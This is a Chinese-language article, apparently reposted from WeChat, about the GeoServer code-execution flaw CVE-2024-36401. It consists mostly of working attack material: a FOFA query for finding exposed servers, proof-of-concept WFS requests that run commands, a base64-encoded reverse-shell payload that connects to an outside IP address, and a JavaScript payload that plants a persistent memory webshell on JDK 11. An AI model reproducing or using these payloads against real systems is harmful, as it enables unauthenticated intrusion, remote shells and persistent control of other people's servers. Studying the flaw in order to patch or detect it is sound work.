<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fl3b12RNfU4o5ie9oVRvMQ)

GeoServer 属性名表达式前台代码执行漏洞 (CVE-2024-36401)
-----------------------------------------

GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。

在 GeoServer 2.25.1， 2.24.3， 2.23.5 版本及以前，未登录的任意用户可以通过构造恶意 OGC 请求，在默认安装的服务器中执行 XPath 表达式，进而利用执行 Apache Commons Jxpath 提供的功能执行任意代码。

fofa
----

```
app="GeoServer"

```

poc
---

```
GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1')HTTP/1.1
Host:your-ip:8080
Accept-Encoding:gzip,deflate,br
Accept:*/*
Accept-Language:en-US;q=0.9,en;q=0.8
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/124.0.6367.118Safari/537.36
Connection:close
Cache-Control:max-age=0


```

```
POST /geoserver/wfsHTTP/1.1
Host:your-ip:8080
Accept-Encoding:gzip,deflate,br
Accept:*/*
Accept-Language:en-US;q=0.9,en;q=0.8
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/124.0.6367.118Safari/537.36
Connection:close
Cache-Control:max-age=0
Content-Type:application/xml
Content-Length:356

<wfs:GetPropertyValueservice='WFS'version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'>
<wfs:QuerytypeNames='sf:archsites'/>
<wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch/tmp/success2')</wfs:valueReference>
</wfs:GetPropertyValue>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3gCHdu55NfnDnfibN3XFoxNSWFALnmOaG6KCbgdaNGibqAkV3ibxW56IpTElDiaooZKuiagicgM0SYNTTg/640?wx_fmt=png&from=appmsg)1

反弹 shell
--------

```
POST /geoserver/wfsHTTP/1.1
Host:192.168.18.131:8080
Accept-Encoding:gzip,deflate,br
Accept:*/*
Accept-Language:en-US;q=0.9,en;q=0.8
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/124.0.6367.118Safari/537.36
Connection:close
Cache-Control:max-age=0
Content-Type:application/xml
Content-Length:356

<wfs:GetPropertyValueservice='WFS'version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'>
<wfs:QuerytypeNames='sf:archsites'/>
<wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash-c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuNjkuMTYvODA4NSAwPiYx}|{base64,-d}|{bash,-i}')
</wfs:valueReference>
</wfs:GetPropertyValue>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3gCHdu55NfnDnfibN3XFoxNzUFtWAF2UJKibuqT5mF7PWX13JVv9kdicd8t8dKwEEDyWIeRZURHMY4g/640?wx_fmt=png&from=appmsg)

jdk11 注入内存马
-----------

jdk17 版本注入内存马不成功

环境：https://zenlayer.dl.sourceforge.net/project/geoserver/GeoServer/2.25.1/geoserver-2.25.1-bin.zip?viasf=1

```
POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="内存马base64";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>

```

使用 jmg 工具生成内存马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3gCHdu55NfnDnfibN3XFoxNK9tUFST9ZyibFJrXv7EOQwBVYoKvJuI555hX7XRKFLc36ibldpJPXBTw/640?wx_fmt=png&from=appmsg)  

将生成的内存马 base64 填入到`var str="内存马base64";`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3gCHdu55NfnDnfibN3XFoxNmiamOS8Siake5nO3cia99hLeZFe8mgO1jpVQDh9jniaia44brWLusw8FkPw/640?wx_fmt=png&from=appmsg)  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic3gCHdu55NfnDnfibN3XFoxNaEG1w6LYFg85w3wApalXr3qF7qGTQibicicM5PLJcQwhZHsvAu2SNNgvQ/640?wx_fmt=png&from=appmsg)  

漏洞来源
----

*   • https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md
    
*   • https://yzddmr6.com/posts/geoserver-memoryshell/